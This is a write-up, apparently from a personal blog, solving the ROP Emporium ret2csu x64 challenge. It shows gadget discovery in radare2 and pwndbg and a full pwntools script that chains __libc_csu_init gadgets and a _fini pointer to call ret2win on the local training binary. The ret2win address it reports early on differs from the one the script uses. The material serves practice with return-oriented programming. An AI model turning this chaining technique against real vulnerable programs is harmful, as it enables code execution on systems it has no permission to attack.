---
layout: post
title:  "ROP Emporium ret2csu Writeup (x64)"
date:   2024-06-10 00:00:00 -0400
categories: rop-emporium challenge-8
tags: rop-emporium ret2csu x64 writeup buffer-overflow rop reverse-engineering 64-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[final challenge](https://ropemporium.com/challenge/ret2csu.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

According to the
[challenge page](https://ropemporium.com/challenge/ret2csu.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `ret2win` from the `libret2csu` library.
We need to call this function with the arguments
`ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
in order to print the flag.

> This is what a hint will look like!
{: .prompt-tip }

## Offset
The offset for `x64` challenges will be `40 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
of this series.

## Function Address
> What's `ret2win`'s address?
{: .prompt-tip }

Luckily for us `ret2win` is imported so we don't
need to calculate any offsets. With `radare2` run
`aaa` to analyze the binary and `afl` to list the
function addresses

![ret2win address](/images/ret2csu/x64-ret2win-addr.png)

`ret2win`'s function address is `0x00400510`

## Gadgets
### Useful Function
> Check out `usefulFunction`'s assembly
{: .prompt-tip }

Let's see what `usefulFunction` has to offer.
We can view the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![useful function](/images/ret2csu/x64-useful-function.png)

There isn't anything particularly interesting except for
a `call` to the `ret2win` function. Seems like we'll
have to search for gadgets on our own...

### Function Arguments
> What gadgets involve `x64`'s function registers?
{: .prompt-tip }

Referencing this
[x64 cheatsheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf){:target="_blank"}{:rel="noopener noreferrer"}
the first 3 argument registers are `rdi`, `rsi` and `rdx`
in that order. Let's try to find `pop` gadgets for
these registers with the `/R` command

![arg gadgets](/images/ret2csu/x64-arg-gadgets.png)

We can control the first and second argument, but the
third argument will make things trickier...

Let's broaden our search by only looking for gadgets
that use the third argument register `rdx`

![rdx gadget](/images/ret2csu/x64-rdx-gadget.png)

There are only two gadgets. The first one will require
`rdx` to already be set which won't work for us. The
second gadget will let us set `rdx` with `r15`! 

The second gadget also has the effect of setting `rsi`
(argument 2) and `edi` which sets bytes 0-4 of `rdi`
(argument 1). The first argument can't be set with
this gadget since we need all 8 bytes set! (i.e. it
will only set `rdi` to `0xdeadbeef` when we need it
to be `0xdeadbeefdeadbeef`)

We'll also be able to `call` a function if we can control
`r12` and `rbx` so let's look for that next.

### Call Gadget
> Look for gadgets to set `r12` and `rbx`. The gadgets
> will be more than 4 instructions so `radare2`'s
> `/R` won't find what we need by default
{: .prompt-tip }

First let's look for a way to control `r12`

![r12 gadget](/images/ret2csu/x64-r12-gadget.png)

The gadget address is `0x0040069c` but we should
look at what instructions come before it.

```
s 0x0040069c
V
p
```

![rbx gadget](/images/ret2csu/x64-rbx-gadget.png)

Now we can control `rbx` and `rbp` along with `r12`-`r15`
with the gadget at `0x0040069a`!

If we look even further above this gadget we'll find
something interesting

![full gadget](/images/ret2csu/x64-full-gadget.png)

It's the gadget that will set `rdx` and `rsi`, the
last two function arguments!

Since the first function argument won't be set correctly,
we'll need to call our `pop rdi` gadget. Our issue
becomes the unavoidable `call` instruction

![call instruction](/images/ret2csu/x64-call-instruction.png)

We can't set the address of our next gadget into
`r12 + rbx*8` since this value will be dereferenced due to
the square brackets! We also can't `call` the `ret2win`
`plt` entry which contains `ret2win`'s address 
since the first argument will be incorrect.
Ideally we could skip this instruction entirely, or `call`
a function that does nothing. This way we can reach the `ret`
instruction at `0x004006a4` in order to chain additional
gadgets.

### Call Address
> Look at the other available functions and find a
> pointer to the target
{: .prompt-tip }

Take a look at the available functions again with
`afl`

![function addresses](/images/ret2csu/x64-ret2win-addr.png)

Alternatively you can look at functions along with
their assembly by pressing a capital `V` followed
by a lowercase `v`. Navigate between functions
with `j` and `k`

![fini asm](/images/ret2csu/x64-fini-asm.png)

The `_fini` function will subtract `rsp` by 8, add `rsp`
by 8, and then return. This will essentially do nothing
allowing us to chain together other gadgets!

Now we need to find an address which points to `_fini`.
This time we'll use the `search` command in `pwndbg`.
The address of `_fini` is `0x004006b4` so we can search
for a pointer to that value with the `-p` flag

```
search -p 0x004006b4
```

![fini pointer](/images/ret2csu/x64-fini-pointer.png)

If we set the `call` address to `0x600e48` we'll be able
to call `_fini` (which does nothing) and then chain
other gadgets together!

Looking at what our `call` instruction is

![call instruction](/images/ret2csu/x64-call-instruction.png)

We can find the value we need in `r12` and `rbx`
with some arithmetic. Let's use the first address
pointer `0x6003b0`

![call addr math](/images/ret2csu/x64-call-addr-math.png)

`r12` will be `0` and `rbx` will be `0xc0076`

### Chaining Gadgets
> Look at the instructions after the `call` and figure
> out how to reach the `ret` instruction
{: .prompt-tip }

Let's take a look at what comes after our `call` gadget.

![full gadget](/images/ret2csu/x64-full-gadget.png)

After `_fini` is done executing, the instruction
pointer will continue running the instructions after
the `call` instruction (`0x0040068d`).

There is a pesky `jne` (jump if not equal to) instruction
which we'll want to avoid. To avoid the jump we'll need
to make `rbp` the same value as `rbx + 1`. 

After that
we'll have 6 `pop` instructions along with a stack adjustment
from `add rsp, 8`. This means we'll need to add 7 total
junk values.

Once this is done we'll reach the `ret` instruction and
can chain a `pop rdi` gadget (function argument 1).
After this, we'll be
able to call `ret2win` with the proper arguments!

## Exploit
We have everything we need to build our exploit

First we `pop` registers `rbx`, `rbp` and `r12-r15`. Then
we jump to the `call` gadget which will set function
arguments 2 and 3, then call the `_fini` function. After
this, we pass garbage until we reach our next gadget.
We can then call `pop rdi` to set the first function
argument and then `ret2win` to get the flag!

```python
#!/bin/python3
from pwn import *

ret2win_addr = 0x0040062a
call_gadget = 0x00400680

# add n junk values to stack
def add_junk(n):
    junk = 0x1234123412341234
    payload = b''
    for i in range(n):
        payload += p64(junk)
    return payload

# set first function arg
def pop_rdi(inp):
    return p64(0x004006a3) + p64(inp)

# pops rbx, rbp, r12, r13, r14, r15
# accepts a list of register values
def pop_rs(regs):
    payload = p64(0x0040069a)
    for reg in regs:
        payload += p64(reg)
    return payload

# sets all args then calls ret2win
def ret2win(inp1, inp2, inp3):
    payload = b''

    # set function args 2 and 3
    r13 = inp1
    r14 = inp2
    r15 = inp3
    rbx = 0xC0076
    # rbp value to avoid jne
    rbp = rbx + 1
    # call [r12 + rbx*8]
    # call _fini() with call
    r12 = 0
    regs = [rbx, rbp, r12, r13, r14, r15]
    payload += pop_rs(regs)

    # sets args 2 and 3
    # then calls _fini
    payload += p64(call_gadget)

    # set junk values for proceeding pops
    # rbx, rbp, r12-r15 and extra stack entry
    payload += add_junk(7)

    # set arg1
    payload += pop_rdi(inp1)

    # call ret2win
    payload += p64(ret2win_addr)
    return payload

# create payload
payload = b'A' * 40
payload += ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

# send payload + receive flag
io = process('./ret2csu')
io.recvuntil(b'>')
io.sendline(payload)
io.recvuntil(b'Thank you!\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```

![x64 flag](/images/ret2csu/x64-flag.png)

## Conclusion
In this challenge we learned how to build a ROP chain
when there aren't many available gadgets. We needed to
find various ways to continue execution until we were
able to chain other gadgets together.

Thanks for reading and hopefully you're now 
able to comfortably construct ROP chains under `x64`!

[Previous Challenge (pivot)]({% post_url 2024-06-07-rop-emporium-pivot-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

(there isn't an `x86` version of this challenge)
